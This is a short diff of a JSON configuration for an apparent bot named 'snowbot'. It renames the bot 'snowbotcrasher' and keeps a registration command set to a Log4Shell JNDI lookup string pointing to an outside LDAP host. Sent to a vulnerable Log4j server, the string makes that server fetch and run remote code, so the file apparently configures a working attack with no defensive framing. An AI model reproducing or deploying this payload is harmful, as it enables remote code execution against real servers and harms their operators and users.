@@ -1,7 +1,7 @@
 {
 	"ip":"nl1.duckhost.cloud000",
 	"port": 8018,
-	"name": "snowbot",
+	"name": "snowbotcrasher",
 	"auto-night-skip":"false",
 	"login-enabled":"true",
 	"register-cmd":"/${jndi:ldap://snowanarchy.ga:9313/test}",
